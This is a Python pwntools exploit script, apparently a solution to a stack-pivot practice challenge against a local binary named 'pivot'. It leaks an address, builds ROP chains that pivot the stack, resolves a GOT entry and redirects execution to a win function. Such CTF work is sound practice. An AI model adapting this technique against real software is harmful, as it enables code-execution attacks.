#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
context.terminal = ['tmux', 'splitw', '-h'] #GDB splits
exe = './pivot'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
set disable-randomization off
break *pwnme+163
break *pwnme+159
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

elf = ELF(exe)
second_chain = ROP(elf)


junk=0xdeadbeefdeadbeef
canary=0xbadc0de

print(io.recvuntil('place to pivot: '))
rax = io.recv().split(b'\n')[0][2:]
print(rax)

rax = p64(int(rax,16))
pop_rax = 0x400b00
mov_rax_ptr_rax = 0x400b05
jmp_rax = 0x00000000004008f5
add_rax_rbp = 0x400b09
got_plt_foothold_function = 0x602048

#Find foothold_function and it's offset from ret2win
second_chain.raw(elf.plt.foothold_function)
second_chain.raw(p64(pop_rax))
second_chain.raw(p64(got_plt_foothold_function))
second_chain.raw(p64(mov_rax_ptr_rax))
second_chain.raw(p64(add_rax_rbp))
second_chain.raw(p64(jmp_rax))

payload = fit({0:second_chain.chain()},length=255)
io.send(payload)
#payload = cyclic(10)
#io.sendline(payload)


first_chain = ROP(elf)
xchg_rax_rsp = 0x400b02

#Stack Pivot
first_chain.raw(p64(pop_rax))
first_chain.raw(rax)
first_chain.raw(p64(xchg_rax_rsp))
payload = fit({0:rax,32:p64(334),40:first_chain.chain()},length=200)
io.send(payload)

#payload = cyclic(10)
#io.sendline(payload)

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

